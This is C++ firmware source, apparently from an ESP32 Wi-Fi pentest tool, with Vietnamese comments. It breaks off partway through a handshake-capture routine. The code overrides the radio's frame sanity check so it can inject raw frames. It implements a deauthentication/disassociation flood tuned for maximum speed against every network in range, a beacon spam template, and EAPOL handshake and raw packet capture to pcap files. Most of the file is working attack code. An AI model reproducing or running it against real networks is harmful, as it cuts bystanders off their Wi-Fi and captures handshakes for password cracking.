// Borrowed from https://github.com/justcallmekoko/ESP32Marauder/
// Learned from https://github.com/risinek/esp32-wifi-penetration-tool/
// Arduino IDE needs to be tweeked to work, follow the instructions:
// https://github.com/justcallmekoko/ESP32Marauder/wiki/arduino-ide-setup But change the file in:
// C:\Users\<YOur User>\AppData\Local\Arduino15\packages\m5stack\hardware\esp32\2.0.9
#include "wifi_atks.h"
#include "core/display.h"
#include "core/main_menu.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "evil_portal.h"
#include "sniffer.h"
#include "vector"
#include <Arduino.h>
#include <globals.h>
#include <nvs_flash.h>

#define WIFI_ATK_NAME "BruceAttack"
extern bool showHiddenNetworks;

std::vector<wifi_ap_record_t> ap_records;
std::vector<wifi_ap_record_t> selected_targets;
/**
 * @brief Decomplied function that overrides original one at compilation time.
 *
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337) return 1;
    else return 0;
}

uint8_t deauth_frame[sizeof(deauth_frame_default)]; // 26 = [sizeof(deauth_frame_default[])]

wifi_ap_record_t ap_record;

// Beacon packet template
// clang-format off
constexpr size_t BEACON_PKT_LEN = 109;
const uint8_t beaconPacketTemplate[BEACON_PKT_LEN] = {
    /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: management beacon frame
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
    /* 10 - 15 */ 0x01, 0x02,  0x03, 0x04, 0x05, 0x06, // Source (placeholder - overwritten)
    /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (placeholder - overwritten)
    /* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (SDK will set)
    /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
    /* 32 - 33 */ 0xe8, 0x03, // Interval (1s)
    /* 34 - 35 */ 0x31, 0x00, // Capability info (will set WPA flag later)
    /* 36 - 37 */ 0x00, 0x20,         // Tag: SSID parameter set, tag length 32 (we will write SSID into bytes 38..69)
    /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
    /* 70 - 71 */ 0x01, 0x08, // Supported rates tag length 8
    /* 72 */ 0x82,
    /* 73 */ 0x84,
    /* 74 */ 0x8b,
    /* 75 */ 0x96,
    /* 76 */ 0x24,
    /* 77 */ 0x30,
    /* 78 */ 0x48,
    /* 79 */ 0x6c,
    /* 80 - 81 */ 0x03, 0x01,          // Current Channel tag
    /* 82 */ 0x01, // Current channel (overwritten)
    /* 83 - 84 */ 0x30, 0x18, // RSN information (start)
    /* 85 - 86 */ 0x01, 0x00,
    /* 87 - 90 */ 0x00, 0x0f, 0xac, 0x02,
    /* 91 - 92 */ 0x02, 0x00,
    /* 93 -100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
    /*101 -102 */ 0x01, 0x00,
    /*103 -106 */ 0x00, 0x0f, 0xac, 0x02,
    /*107 -108 */ 0x00, 0x00
};
// clang-format on
static inline void prepareBeaconPacket(
    uint8_t outPacket[BEACON_PKT_LEN], const uint8_t macAddr[6], const char *ssid, uint8_t ssidLen,
    uint8_t channel, bool setWPAflag = true
) {
    // copy template into a packet
    memcpy(outPacket, beaconPacketTemplate, BEACON_PKT_LEN);

    // write MAC addresses (source and BSSID)
    memcpy(&outPacket[10], macAddr, 6); // Source
    memcpy(&outPacket[16], macAddr, 6); // BSSID

    // ensure SSID slot is cleared (32 bytes) then copy SSID
    memset(&outPacket[38], 0x20, 32); // keep template behavior
    if (ssidLen > 32) ssidLen = 32;
    if (ssidLen > 0) { memcpy(&outPacket[38], ssid, ssidLen); }

    // set channel and WPA flags
    outPacket[82] = channel;
    outPacket[34] = 0x31;
}

const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11}; // used Wi-Fi channels (available: 1-14)
uint8_t channelIndex = 0;
uint8_t wifi_channel = 1;

void nextChannel() {
    const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
    const size_t nChannels = sizeof(channels) / sizeof(channels[0]);
    static uint8_t channelIndex = 0;

    channelIndex = (channelIndex + 1) % nChannels;
    uint8_t ch = channels[channelIndex];
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

/***************************************************************************************
** Function: send_raw_frame
** @brief: Broadcasts deauth frames
***************************************************************************************/
void send_raw_frame(const uint8_t *frame_buffer, int size) {
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    vTaskDelay(1 / portTICK_PERIOD_MS);
}

/***************************************************************************************
** function: wsl_bypasser_send_raw_frame
** @brief: prepare the frame to deploy the attack
***************************************************************************************/
// Xóa "= nullptr" ở đây vì nó đã có trong file .h
void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_rec, uint8_t chan, const uint8_t target[6]) {
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(50 / portTICK_PERIOD_MS);

    uint8_t dest[6];
    if (target == nullptr) {
        memset(dest, 0xFF, 6); // Gửi Broadcast nếu không có target cụ thể
    } else {
        memcpy(dest, target, 6);
    }

    memcpy(&deauth_frame[4], dest, 6);
    memcpy(&deauth_frame[10], ap_rec->bssid, 6);
    memcpy(&deauth_frame[16], ap_rec->bssid, 6);
}

/***************************************************************************************
** function: wifi_atk_info
** @brief: Open Wifi information screen (Upgraded to support multiple targets)
***************************************************************************************/
void wifi_atk_info(String tssid_unused, String mac_unused, uint8_t channel_unused) {
    if (selected_targets.empty()) return;

    int currentIndex = 0;
    bool redraw = true;
    bool exitMenu = false;

    while (!exitMenu) {
        if (redraw) {
            tft.fillScreen(bruceConfig.bgColor);
            drawMainBorderWithTitle("AP INFORMATION");

            wifi_ap_record_t &rec = selected_targets[currentIndex];

            // 1. XỬ LÝ CHUỖI SSID (Tối ưu cho font FP trên màn hình hẹp)
            String ssidStr = String((char *)rec.ssid);
            if (ssidStr.length() == 0) ssidStr = "<Hidden>";
            if (ssidStr.length() > 22) ssidStr = ssidStr.substring(0, 20) + "..";

            char macStr[18];
            sprintf(
                macStr,
                "%02X:%02X:%02X:%02X:%02X:%02X",
                rec.bssid[0],
                rec.bssid[1],
                rec.bssid[2],
                rec.bssid[3],
                rec.bssid[4],
                rec.bssid[5]
            );

            String encStr = "Unknown";
            switch (rec.authmode) {
                case WIFI_AUTH_OPEN: encStr = "Open"; break;
                case WIFI_AUTH_WEP: encStr = "WEP"; break;
                case WIFI_AUTH_WPA_PSK: encStr = "WPA"; break;
                case WIFI_AUTH_WPA2_PSK: encStr = "WPA2"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: encStr = "WPA/2"; break;
                case WIFI_AUTH_WPA2_ENTERPRISE: encStr = "WPA2/E"; break;
                case WIFI_AUTH_WPA3_PSK: encStr = "WPA3"; break;
                default: encStr = "Secured"; break;
            }

            tft.setTextSize(FP);
            tft.setTextColor(bruceConfig.priColor);

            // 2. TÍNH TOÁN TỌA ĐỘ "TỶ LỆ VÀNG"
            int frameY = 45;  // Đẩy lên 38px để khung to hơn (vừa đẹp dưới Title)
            int footerH = 20; // Hàng nút cao 20px
            int footerY = tftHeight - footerH - 6;
            int frameH = footerY - frameY - 16; // Tự động co giãn theo màn hình

            // Vẽ khung thông tin bo góc
            tft.drawRoundRect(6, frameY, tftWidth - 12, frameH, 4, bruceConfig.priColor);

            // Header nhỏ bên trong khung: Target X/Y
            tft.setCursor(12, frameY + 6);
            tft.printf("Target: %d / %d", currentIndex + 1, (int)selected_targets.size());
            tft.drawLine(6, frameY + 20, tftWidth - 7, frameY + 20, bruceConfig.priColor);

            // Nội dung chi tiết (Căn chỉnh Tabular cho đẹp)
            int contentY = frameY + 28;
            int lineGap = (frameH - 35) / 3; // Chia đều 3 khoảng trống

            tft.setCursor(12, contentY);
            tft.print("SSID :");
            tft.setCursor(55, contentY);
            tft.print(ssidStr);

            tft.setCursor(12, contentY + lineGap);
            tft.print("BSSID:");
            tft.setCursor(55, contentY + lineGap);
            tft.print(String(macStr));

            tft.setCursor(12, contentY + lineGap * 2);
            tft.print("INFO :");
            tft.setCursor(55, contentY + lineGap * 2);
            tft.printf("Ch:%d %ddBm %s", rec.primary, rec.rssi, encStr.c_str());

            // 3. VẼ FOOTER: 3 CỤM NÚT TRÊN 1 HÀNG
            tft.drawLine(6, footerY, tftWidth - 12, footerY, bruceConfig.priColor);

            int btnY = footerY + 6;

            // Nút Prev (Trái)
            if (selected_targets.size() > 1) {
                tft.setCursor(10, btnY);
                tft.print("[< PRV]");
            }

            // Nút EXIT (Chính giữa)
            String exitLabel = "[ SEL:EXIT ]";
            tft.drawCentreString(exitLabel, tftWidth / 2, btnY, 1);

            // Nút Next (Phải)
            if (selected_targets.size() > 1) {
                String nextLabel = "[NXT >]";
                tft.setCursor(tftWidth - tft.textWidth(nextLabel) - 10, btnY);
                tft.print(nextLabel);
            }

            redraw = false;
        }

        // --- 4. XỬ LÝ NÚT BẤM ---
        if (check(EscPress) || check(SelPress)) {
            returnToMenu = true;
            exitMenu = true;
        }
        if (check(NextPress) && selected_targets.size() > 1) {
            currentIndex = (currentIndex + 1) % selected_targets.size();
            redraw = true;
            vTaskDelay(100 / portTICK_PERIOD_MS);
        }
        if (check(PrevPress) && selected_targets.size() > 1) {
            currentIndex = (currentIndex - 1 + selected_targets.size()) % selected_targets.size();
            redraw = true;
            vTaskDelay(100 / portTICK_PERIOD_MS);
        }
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }
}
/***************************************************************************************
** function: wifi_atk_setWifi
** @brief: Sets the Minimum Wifi parameters to WiFi Attacks
***************************************************************************************/
bool wifi_atk_setWifi() {
    if (WiFi.getMode() != WIFI_MODE_APSTA) {
        if (!WiFi.mode(WIFI_MODE_APSTA)) {
            displayError("Failed starting WIFI", true);
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    if (WiFi.softAPSSID() != bruceConfig.wifiAp.ssid && WiFi.softAPSSID() != WIFI_ATK_NAME) {
        if (!WiFi.softAP(WIFI_ATK_NAME, emptyString, 1, 1, 4, false)) {
            displayError("Failed starting  AP Attacker", true);
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    return true;
}

/***************************************************************************************
** function: wifi_atk_unsetWifi
** @brief: Sets the Minimum Wifi parameters to WiFi Attacks
***************************************************************************************/
bool wifi_atk_unsetWifi() {
    if (WiFi.softAPSSID() == WIFI_ATK_NAME) {
        if (!WiFi.softAPdisconnect()) {
            displayError("Failed Stopping AP Attacker", true);
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    if (WiFi.status() != WL_CONNECTED && WiFi.softAPSSID() != bruceConfig.wifiAp.ssid) wifiDisconnect();

    return true;
}

/***************************************************************************************
** function: target_atk_menu
** @brief: Open menu to choose which AP Attack
***************************************************************************************/
struct NetworkGroup {
    String ssid;
    int maxRssi;
    bool has24 = false;
    bool has5 = false;
    std::vector<wifi_ap_record_t> aps;
};

// --- CẤU TRÚC DỮ LIỆU ĐỂ GỘP MẠNG ---
struct DiscoveredSSID {
    String ssid;
    wifi_ap_record_t *record2G = nullptr; // Con trỏ trỏ đến bản ghi 2.4G gốc
    wifi_ap_record_t *record5G = nullptr; // Con trỏ trỏ đến bản ghi 5G gốc
    bool selected = false;

    // Hàm lấy nhãn hiển thị
    String getLabel() {
        if (record2G != nullptr && record5G != nullptr) return "2.4G & 5G";
        if (record5G != nullptr) return "5G Only";
        return "2.4G Only";
    }

    // Hàm lấy thông tin kênh để hiển thị
    String getChannelStr() {
        String s = "";
        if (record2G) s += String(record2G->primary);
        if (record2G && record5G) s += "/";
        if (record5G) s += String(record5G->primary);
        return s;
    }
};

std::vector<DiscoveredSSID> unique_networks;

// Hàm kiểm tra và xóa/thêm vào danh sách chọn (selected_targets)
void toggleSelection(DiscoveredSSID &item) {
    item.selected = !item.selected;

    // Helper lambda để thêm/xóa trong vector selected_targets
    auto updateTarget = [&](wifi_ap_record_t *rec, bool add) {
        if (!rec) return;
        // Tìm xem đã có trong selected_targets chưa
        int index = -1;
        for (size_t i = 0; i < selected_targets.size(); i++) {
            if (memcmp(selected_targets[i].bssid, rec->bssid, 6) == 0) {
                index = i;
                break;
            }
        }

        if (add && index == -1) {
            selected_targets.push_back(*rec);
        } else if (!add && index != -1) {
            selected_targets.erase(selected_targets.begin() + index);
        }
    };

    // Nếu chọn: Thêm cả 2G và 5G (nếu có) vào danh sách tấn công
    // Nếu bỏ chọn: Xóa cả 2 khỏi danh sách
    updateTarget(item.record2G, item.selected);
    updateTarget(item.record5G, item.selected);
}

void wifi_atk_menu() {
    bool scanAtks = false;
    static int myCursor = 0;
    bool needRescan = false;

    // --- MENU CAP 1: CHON CHE DO ---
    options = {
        {"Target Atks",
         [&]() {
             scanAtks = true;
             myCursor = 0;
         }                                             },
        {"Deauth Flood", [&]() { deauthFloodAttack(); }},
        {"Beacon SPAM",  [&]() { beaconAttack(); }     }
    };
    addOptionToMainMenu();

    myCursor = loopOptions(options, myCursor);

    // Neu khong chon "Target Atks" thi thoat
    if (!scanAtks) return;

    // --- VONG LAP QUET VA HIEN THI DANH SACH ---
    do {
        needRescan = false;

        // Cau hinh WiFi de quet
        if (!wifi_atk_setWifi()) return;

        displayTextLine("Scanning...");
        int nets = WiFi.scanNetworks(false, showHiddenNetworks);

        ap_records.clear();
        selected_targets.clear();

        // 1. Luu ket qua quet vao vector tam
        for (int i = 0; i < nets; i++) {
            wifi_ap_record_t record;
            memset(&record, 0, sizeof(record));
            memcpy(record.bssid, WiFi.BSSID(i), 6);
            record.primary = static_cast<uint8_t>(WiFi.channel(i));
            record.authmode = static_cast<wifi_auth_mode_t>(WiFi.encryptionType(i));
            record.rssi = WiFi.RSSI(i);

            String ssidName = WiFi.SSID(i);
            if (ssidName.length() == 0) {
                ssidName = "<Hidden> " + String(record.bssid[0], HEX) + String(record.bssid[5], HEX);
            }
            strncpy((char *)record.ssid, ssidName.c_str(), sizeof(record.ssid) - 1);
            ap_records.push_back(record);
        }

        // 2. Gom nhom cac mang trung SSID (2.4GHz va 5GHz)
        std::vector<NetworkGroup> grouped_networks;
        for (const auto &record : ap_records) {
            String currentSSID = String((char *)record.ssid);
            bool found = false;
            for (auto &group : grouped_networks) {
                if (group.ssid == currentSSID) {
                    group.aps.push_back(record);
                    if (record.primary > 14) group.has5 = true;
                    else group.has24 = true;
                    if (record.rssi > group.maxRssi) group.maxRssi = record.rssi;
                    found = true;
                    break;
                }
            }
            if (!found) {
                NetworkGroup newGroup;
                newGroup.ssid = currentSSID;
                newGroup.aps.push_back(record);
                if (record.primary > 14) newGroup.has5 = true;
                else newGroup.has24 = true;
                newGroup.maxRssi = record.rssi;
                grouped_networks.push_back(newGroup);
            }
        }

        // Sap xep theo tin hieu manh nhat (RSSI)
        std::sort(
            grouped_networks.begin(),
            grouped_networks.end(),
            [](const NetworkGroup &a, const NetworkGroup &b) { return a.maxRssi > b.maxRssi; }
        );

        bool stayingInMenu = true;
        if (myCursor == 0 && !grouped_networks.empty()) myCursor = 0;

        while (stayingInMenu) {
            options.clear();

            // 3. DONG THONG BAO TONG SO MANG & NUT MO MENU TAN CONG
            String headerLabel = "[ Found: " + String(grouped_networks.size()) + " APs ]";
            if (selected_targets.empty()) {
                options.push_back({headerLabel.c_str(), []() { /* Header only */ }});
            } else {
                String btnAtk = "[ ATTACK MENU (" + String(selected_targets.size()) + ") ]";
                options.push_back(
                    {btnAtk.c_str(), [&]() {
                         // Lay AP dau tien lam dai dien de mo menu
                         wifi_ap_record_t &rep = selected_targets[0];
                         char bssidStr[18];
                         sprintf(
                             bssidStr,
                             "%02X:%02X:%02X:%02X:%02X:%02X",
                             rep.bssid[0],
                             rep.bssid[1],
                             rep.bssid[2],
                             rep.bssid[3],
                             rep.bssid[4],
                             rep.bssid[5]
                         );

                         target_atk_menu(String((char *)rep.ssid), String(bssidStr), rep.primary);
                         returnToMenu = true;
                         vTaskDelay(200 / portTICK_PERIOD_MS);
                     }}
                );
            }

            // 4. HIEN THI DANH SACH MANG
            for (int i = 0; i < (int)grouped_networks.size(); i++) {
                bool isAnyApSelected = false;
                for (const auto &ap : grouped_networks[i].aps) {
                    for (const auto &sel : selected_targets) {
                        if (memcmp(sel.bssid, ap.bssid, 6) == 0) {
                            isAnyApSelected = true;
                            break;
                        }
                    }
                    if (isAnyApSelected) break;
                }

                String prefix = isAnyApSelected ? "[x] " : "[ ] ";
                String bandStr = (grouped_networks[i].has24 && grouped_networks[i].has5)
                                     ? "2.4/5G"
                                     : (grouped_networks[i].has5 ? "5G" : "2.4G");

                String optionText = prefix + grouped_networks[i].ssid + " (" +
                                    String(grouped_networks[i].maxRssi) + "dBm " + bandStr + ")";

                options.push_back({optionText.c_str(), [=, &grouped_networks]() {
                                       if (isAnyApSelected) {
                                           // Bo chon: Xoa tat ca AP cua nhom nay khoi selected_targets
                                           for (const auto &ap : grouped_networks[i].aps) {
                                               for (size_t k = 0; k < selected_targets.size(); k++) {
                                                   if (memcmp(selected_targets[k].bssid, ap.bssid, 6) == 0) {
                                                       selected_targets.erase(selected_targets.begin() + k);
                                                       k--;
                                                   }
                                               }
                                           }
                                       } else {
                                           // Chon: Them tat ca AP cua nhom nay vao selected_targets
                                           for (const auto &ap : grouped_networks[i].aps) {
                                               selected_targets.push_back(ap);
                                           }
                                       }
                                       returnToMenu = true;
                                   }});
            }

            // 5. NUT RESCAN VA BACK
            options.push_back({">> Rescan Networks", [&]() {
                                   needRescan = true;
                                   stayingInMenu = false;
                                   returnToMenu = true;
                               }});

            addOptionToMainMenu();
            myCursor = loopOptions(options, myCursor);

            // DIEU HUONG
            if (check(EscPress) || (returnToMenu && myCursor == (int)options.size() - 1)) {
                stayingInMenu = false;
                needRescan = false;
                myCursor = 0;
            } else if (returnToMenu) {
                returnToMenu = false; // Reset de ve lai giao dien voi dau [x] moi
            }
            vTaskDelay(10 / portTICK_PERIOD_MS);
        }
    } while (needRescan);

    wifi_atk_unsetWifi();
}

/***************************************************************************************
** function: deauthFloodAttack
** @brief: Broadcasts deauth frames to all scanned APs (Upgraded with Smart Hopping & Sorting)
***************************************************************************************/
void deauthFloodAttack() {
    // 1. Thiết lập WiFi để quét (SCAN)
    if (!wifi_atk_setWifi()) return;

    // Vẽ màn hình Scan
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("Scanning...");
    tft.setTextSize(FM);
    tft.setTextColor(bruceConfig.priColor);
    tft.setCursor(20, 60);
    tft.print("Please wait...");

    // Quét tất cả các mạng (bao gồm cả mạng ẩn)
    int nets = WiFi.scanNetworks(false, true);
    if (nets == 0) {
        displayError("No networks found!", true);
        return;
    }

    // 2. Lưu danh sách mục tiêu
    struct Target {
        uint8_t bssid[6];
        uint8_t channel;
    };
    std::vector<Target> targets;

    for (int i = 0; i < nets; i++) {
        Target t;
        memcpy(t.bssid, WiFi.BSSID(i), 6);
        t.channel = WiFi.channel(i);
        targets.push_back(t);
    }

    // TỐI ƯU 1: Sắp xếp danh sách mục tiêu theo Kênh (Channel) từ nhỏ đến lớn
    // Giúp càn quét sạch một kênh trước khi mất thời gian nhảy sang kênh khác
    std::sort(targets.begin(), targets.end(), [](const Target &a, const Target &b) {
        return a.channel < b.channel;
    });

    // 3. Chuẩn bị tấn công
    WiFi.disconnect(true);
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_ps(WIFI_PS_NONE);

    // Gói tin mẫu (Sẽ được tùy biến động trong vòng lặp)
    uint8_t packet[26] = {
        0xC0, 0x00, 0x3A, 0x01,             // [0-3] Frame Control
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // [4-9] Destination (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // [10-15] Source
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // [16-21] BSSID
        0x00, 0x00,                         // [22-23] Sequence Number
        0x07, 0x00                          // [24-25] Reason Code
    };

    // --- 4. VẼ GIAO DIỆN TĨNH ---
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("Deauth Flood");
    setCpuFrequencyMhz(240); // Ép xung tối đa

    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setCursor(10, 45);
    tft.print("Targets: " + String(targets.size()) + " APs");

    tft.setCursor(10, 65);
    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
    tft.print("Status: FLOODING...");

    // --- 5. VÒNG LẶP TẤN CÔNG ĐỈNH CAO ---
    bool running = true;
    uint32_t tmp = millis();
    uint16_t count = 0;
    uint8_t current_channel = 0; // Theo dõi kênh hiện tại

    while (running) {
        // Lặp qua tất cả mạng tìm được (đã được sắp xếp theo kênh)
        for (const auto &t : targets) {

            // TỐI ƯU 2: Smart Channel Hopping
            // Chỉ tắt Promiscuous và cấu hình lại phần cứng khi Kênh thực sự thay đổi
            if (current_channel != t.channel) {
                esp_wifi_set_promiscuous(false);
                esp_wifi_set_channel(t.channel, WIFI_SECOND_CHAN_NONE);
                esp_wifi_set_promiscuous(true);
                current_channel = t.channel;
                vTaskDelay(2 / portTICK_PERIOD_MS); // Nhường một chút thời gian cho Radio ổn định
            }

            // Khảm MAC của mục tiêu vào gói tin
            memcpy(&packet[10], t.bssid, 6); // Source
            memcpy(&packet[16], t.bssid, 6); // BSSID

            // TỐI ƯU 3: Bắn chùm gói tin hỗn hợp (Mixed Burst)
            for (int k = 0; k < 4; k++) {
                // Luân phiên Deauth (0xC0) và Disassoc (0xA0)
                packet[0] = (k % 2 == 0) ? 0xC0 : 0xA0;

                // Trộn Reason Code: 7, 2, 39
                if (k % 3 == 0) packet[24] = 0x07;
                else if (k % 3 == 1) packet[24] = 0x02;
                else packet[24] = 0x27;

                esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
                count++;
                delayMicroseconds(5); // Delay siêu nhỏ để flood nhanh nhất có thể
            }

            // Quét nút bấm thoát ngay trong vòng lặp con để dừng lập tức khi có lệnh
            if (check(SelPress) || check(EscPress)) {
                running = false;
                break;
            }
        }

        // --- CẬP NHẬT TỐC ĐỘ (FRAMES/S) ---
        if (millis() - tmp >= 1000) {
            int dynamicY = tftHeight - 10 - 15;
            tft.fillRect(10, dynamicY, tftWidth - 20, 20, bruceConfig.bgColor);
            tft.setCursor(10, dynamicY);
            tft.print("Frames: " + String(count) + " pkts/s");

            count = 0;
            tmp = millis();
        }

        // Nhả CPU 1 tick để hệ điều hành hoạt động, tránh lỗi WDT
        vTaskDelay(1 / portTICK_PERIOD_MS);
    }

    // 6. Dọn dẹp an toàn khi thoát
    esp_wifi_set_promiscuous(false);
    wifi_atk_unsetWifi();
    returnToMenu = true;
}

// =========================================================================
// KHAI BÁO CÁC BIẾN TOÀN CỤC CHO HANDSHAKE VÀ RAW PCAP LOGGER CHẠY NGẦM
// =========================================================================
uint8_t targetBssid[6]; // Bắt buộc phải có để backend sniffer.cpp nhận diện mục tiêu

File rawPcapFile;
volatile uint32_t raw_packet_count = 0;
volatile uint32_t raw_bytes_written = 0;

const uint8_t pcap_global_header[] = {0xd4, 0xc3, 0xb2, 0xa1, 0x02, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
                                      0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00, 0x69, 0x00, 0x00, 0x00};

// Hàm Callback Kép: Vừa lưu file RAW (Mọi gói tin), vừa ném cho hàm sniffer() bắt Handshake
void unified_sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (rawPcapFile) {
        wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
        uint32_t len = pkt->rx_ctrl.sig_len;

        uint64_t timestamp = esp_timer_get_time();
        uint32_t ts_sec = timestamp / 1000000;
        uint32_t ts_usec = timestamp % 1000000;

        uint8_t pkt_header[16];
        memcpy(&pkt_header[0], &ts_sec, 4);
        memcpy(&pkt_header[4], &ts_usec, 4);
        memcpy(&pkt_header[8], &len, 4);
        memcpy(&pkt_header[12], &len, 4);

        rawPcapFile.write(pkt_header, 16);
        rawPcapFile.write(pkt->payload, len);

        raw_packet_count++;
        raw_bytes_written += (16 + len);
    }

    // Gọi hàm sniffer gốc của backend để xử lý EAPOL (M1-M4)
    sniffer(buf, type);
}

// =========================================================================
// HÀM CAPTURE HANDSHAKE CHÍNH (ĐÃ TÍCH HỢP ĐẦY ĐỦ TÍNH NĂNG VÀ FIX LỖI)
// =========================================================================
void capture_handshake(String tssid_unused, String mac_unused, uint8_t channel_unused) {
    if (selected_targets.empty()) return;

    // --- 1. MENU CHỌN CHẾ ĐỘ (Chỉ hiển thị 2 mục cơ bản) ---
    bool isAutoMode = false;
    bool startCapture = false;

    options = {
        {"Manual Capture",
         [&]() {
             isAutoMode = false;
             startCapture = true;
             returnToMenu = true;
         }                        },
        {"Auto Capture",   [&]() {
             isAutoMode = true;
             startCapture = true;
             returnToMenu = true;
         }}
    };

    addOptionToMainMenu();
    loopOptions(options);

    if (!startCapture) {
        returnToMenu = true;
        return;
    }
    returnToMenu = false;

    // --- 2. KHỞI TẠO BIẾN DYNAMIC ---
    int currentIndex = 0;
    int lastIndex = -1;
    bool exitCapture = false;
    int deauthCount = 0;
    int prevNumEAPOL = num_EAPOL;
    bool hasBeacons = false;
    bool captured = false;

    bool forceFullRedraw = true;
    bool updateStatsOnly = false;
    uint32_t autoStartTime = 0;
    bool autoDeauthFired = false;

    // THIẾT LẬP TỌA ĐỘ GIAO DIỆN (FONT FP)
    tft.setTextSize(FP);
    int frameY = 45;
    int footerH = 20;
    int footerY = tftHeight - footerH - 4;
    int frameH = 55;
    int statY = frameY + frameH + 6;

    // --- 3. DỌN DẸP WIFI AN TOÀN (THAY THẾ CHO CÁC HÀM BỊ THIẾU) ---
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    WiFi.disconnect(true, true);
    WiFi.mode(WIFI_OFF);
    delay(100);

    if (!WiFi.mode(WIFI_MODE_STA)) {
        displayError("Failed starting WIFI", true);
        return;
    }
    vTaskDelay(pdMS_TO_TICKS(100));

    // --- 4. SETUP THẺ NHỚ ---
    FS *fs;
    if (setupSdCard()) {
        fs = &SD;
        isLittleFS = false;
    } else {
        fs = &LittleFS;
        isLittleFS = true;
    }

    if (!fs->exists("/BrucePCAP")) fs->mkdir("/BrucePCAP");
    if (!fs->exists("/BrucePCAP/handshakes")) fs->mkdir("/BrucePCAP/handshakes");

    if (!sniffer_prepare_storage(fs, !isLittleFS)) return;

    // Load template Deauth frame mặc định
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    esp_wifi_set_promiscuous(true);

    // --- 5. VÒNG LẶP CHÍNH ---
    while (!exitCapture) {

        // Khi chuyển sang mục tiêu mới (Target thay đổi)
        if (currentIndex != lastIndex) {
            lastIndex = currentIndex;
            deauthCount = 0;
            hasBeacons = false;
            captured = false;
            autoStartTime = millis();
            autoDeauthFired = false;

            wifi_ap_record_t &rec = selected_targets[currentIndex];
            esp_wifi_set_channel(rec.primary, WIFI_SECOND_CHAN_NONE);

            // Xử lý chuỗi tên WiFi an toàn để làm tên file
            String tssid = String((char *)rec.ssid);
            String sanitizedSsid = "";
            for (size_t i = 0; i < tssid.length() && i < 32; ++i) {
                char c = tssid[i];
                if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' ||
                    c == '_' || c == '.') {
                    sanitizedSsid += c;
                } else {
                    sanitizedSsid += '_';
                }
            }

            if (sanitizedSsid.length() == 0) {
                char bssidHex[32];
                sprintf(
                    bssidHex,
                    "%02X%02X%02X%02X%02X%02X",
                    rec.bssid[0],
                    rec.bssid[1],
                    rec.bssid[2],
                    rec.bssid[3],
                    rec.bssid[4],
                    rec.bssid[5]
                );
                sanitizedSsid = String("HIDDEN_") + String(bssidHex);
            }

            // TẠO FILE RAW PCAP (CHẠY NGẦM)
            char rawFileName[128];
            sprintf(
                rawFileName,
                "/BrucePCAP/handshakes/RAW_%02X%02X%02X%02X%02X%02X_%s.pcap",
                rec.bssid[0],
                rec.bssid[1],
                rec.bssid[2],
                rec.bssid[3],
                rec.bssid[4],
                rec.bssid[5],
                sanitizedSsid.c_str()
            );
            rawPcapFile = fs->open(rawFileName, FILE_WRITE);
            if (rawPcapFile) rawPcapFile.write(pcap_global_header, sizeof(pcap_global_header));
            raw_packet_count = 0;
            raw_bytes_written = sizeof(pcap_global_header);

            // TẠO FILE HANDSHAKE VÀ ĐĂNG KÝ VỚI BACKEND
            char hsFileName[128];
            sprintf(
                hsFileName,
                "/BrucePCAP/handshakes/HS_%02X%02X%02X%02X%02X%02X_%s.pcap",
                rec.bssid[0],
                rec.bssid[1],
                rec.bssid[2],
                rec.bssid[3],
                rec.bssid[4],
                rec.bssid[5],
                sanitizedSsid.c_str()
            );
            String hsFilePath = String(hsFileName);
            if (!fs->exists(hsFileName)) {
